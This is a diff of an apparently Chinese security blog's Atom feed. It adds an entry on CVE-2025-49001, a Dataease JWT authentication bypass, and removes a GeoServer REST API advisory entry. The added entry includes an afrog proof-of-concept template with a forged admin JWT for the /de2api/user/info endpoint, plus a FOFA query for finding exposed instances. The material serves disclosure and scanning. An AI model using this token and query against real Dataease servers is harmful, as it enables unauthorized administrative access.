@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-11T02:30:20.352Z</updated>
+  <updated>2025-06-11T02:45:16.477Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Dataease JWT 认证绕过漏洞</title>
+    <link href="http://example.com/2025/06/11/github_2921577789/"/>
+    <id>http://example.com/2025/06/11/github_2921577789/</id>
+    <published>2025-06-11T02:45:16.482Z</published>
+    <updated>2025-06-11T02:45:16.477Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Dataease JWT 认证绕过漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49001</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CVE-2025-49001 是由于JWT校验机制错误导致攻击者可伪造JWT令牌绕过身份验证流程</p><p><strong>产品厂商：</strong> Dataease</p><p><strong>产品名称：</strong> Dataease</p><p><strong>搜索语法：</strong> body&#x3D;”&#x2F;js&#x2F;index-0.0.0-dataease.js” || body&#x3D;”&#x2F;assets&#x2F;css&#x2F;style-0.0.0-dataease.css”</p><p><strong>来源：</strong> <a href="https://github.com/zan8in/afrog/blob/d5c4fe79940f2fa4077a3348da5e9f899225c76d/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-49001.yaml">https://github.com/zan8in/afrog/blob/d5c4fe79940f2fa4077a3348da5e9f899225c76d/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-49001.yaml</a></p><p><strong>类型：</strong> zan8in&#x2F;afrog:github commit</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">49001</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Dataease JWT 认证绕过漏洞<br>  <span class="hljs-params">author:</span> avic123<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">description:</span> |<br>    CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">49001</span> 是由于JWT校验机制错误导致攻击者可伪造JWT令牌绕过身份验证流程<br>    fofa：body<span class="hljs-operator">=</span><span class="hljs-string">&quot;/js/index-0.0.0-dataease.js&quot;</span> <span class="hljs-operator">||</span> body<span class="hljs-operator">=</span><span class="hljs-string">&quot;/assets/css/style-0.0.0-dataease.css&quot;</span><br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//mp.weixin.qq.com/s/2-FBRPZdPY-4MLYC9Syveg</span><br>  <span class="hljs-params">tags:</span> cve,cve2025,Dataease,JWT<br>  <span class="hljs-params">created:</span> <span class="hljs-number">2025</span><span class="hljs-symbol">/06/11</span><br><br><span class="hljs-params">rules:</span><br>  <span class="hljs-params">r0:</span><br>    <span class="hljs-params">request:</span><br>      <span class="hljs-params">method:</span> GET<br>      <span class="hljs-params">path:</span> <span class="hljs-symbol">/de2api/user/info</span><br>      <span class="hljs-params">headers:</span><br>        <span class="hljs-params">X-DE-TOKEN:</span> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8<br>    <span class="hljs-params">expression:</span> response.status <span class="hljs-operator">==</span> <span class="hljs-number">200</span> <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b<span class="hljs-string">&quot;<span class="hljs-char escape_">\&quot;</span>id<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>1<span class="hljs-char escape_">\&quot;</span>&quot;</span>) <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b<span class="hljs-string">&quot;<span class="hljs-char escape_">\&quot;</span>name<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>系统管理员<span class="hljs-char escape_">\&quot;</span>&quot;</span>) <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b<span class="hljs-string">&quot;<span class="hljs-char escape_">\&quot;</span>oid<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>1<span class="hljs-char escape_">\&quot;</span>&quot;</span>)<br><span class="hljs-params">expression:</span> r0()<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Dataease JWT 认证绕过漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
+    
+    <category term="zan8in/afrog:github commit" scheme="http://example.com/tags/zan8in-afrog-github-commit/"/>
+    
+  </entry>
   
   <entry>
     <title>Apache Struts 路径遍历与远程代码执行漏洞</title>
@@ -518,30 +545,6 @@
     <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
     <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>GeoServer Missing Authorization on REST API Index</title>
-    <link href="http://example.com/2025/06/10/github_2073088160/"/>
-    <id>http://example.com/2025/06/10/github_2073088160/</id>
-    <published>2025-06-10T19:30:05.640Z</published>
-    <updated>2025-06-10T19:30:05.639Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-h86g-x8mm-78m5">https://github.com/advisories/GHSA-h86g-x8mm-78m5</a></p><p><strong>仓库 Star：</strong> 4052</p><p><strong>CVSS 评分：</strong> 5.3</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-h86g-x8mm-78m5">https://github.com/geoserver/geoserver/security/advisories/GHSA-h86g-x8mm-78m5</a></p></li><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27505">https://nvd.nist.gov/vuln/detail/CVE-2025-27505</a></p></li><li><p><a href="https://github.com/geoserver/geoserver/pull/8170">https://github.com/geoserver/geoserver/pull/8170</a></p></li><li><p><a href="https://osgeo-org.atlassian.net/browse/GEOS-11664">https://osgeo-org.atlassian.net/browse/GEOS-11664</a></p></li><li><p><a href="https://osgeo-org.atlassian.net/browse/GEOS-11776">https://osgeo-org.atlassian.net/browse/GEOS-11776</a></p></li><li><p><a href="https://github.com/advisories/GHSA-h86g-x8mm-78m5">https://github.com/advisories/GHSA-h86g-x8mm-78m5</a></p></li></ul><p><strong>描述：</strong></p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>It is possible to bypass the default REST API security and access the index page.</p><h3 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h3><p>The REST API security handles <code>rest</code> and its subpaths but not <code>rest</code> with an extension (e.g., <code>rest.html</code>).</p><h3 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h3><p>The REST API index can disclose whether certain extensions are installed.</p><h3 id="Workaround"><a href="#Workaround" class="headerlink" title="Workaround"></a>Workaround</h3><p>In <code>$&#123;GEOSERVER_DATA_DIR&#125;/security/config.xml</code>, change the paths for the <code>rest</code> filter to <code>/rest.*,/rest/**</code> and change the paths for the <code>gwc</code> filter to <code>/gwc/rest.*,/gwc/rest/**</code> and restart GeoServer.</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://osgeo-org.atlassian.net/browse/GEOS-11664">https://osgeo-org.atlassian.net/browse/GEOS-11664</a><br><a href="https://osgeo-org.atlassian.net/browse/GEOS-11776">https://osgeo-org.atlassian.net/browse/GEOS-11776</a><br><a href="https://github.com/geoserver/geoserver/pull/8170">https://github.com/geoserver/geoserver/pull/8170</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-h86g-x8mm-78m5&quot;&gt;https://github.com/advisories/GHSA-h86g-x8mm-78m5&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
     
   </entry>
   
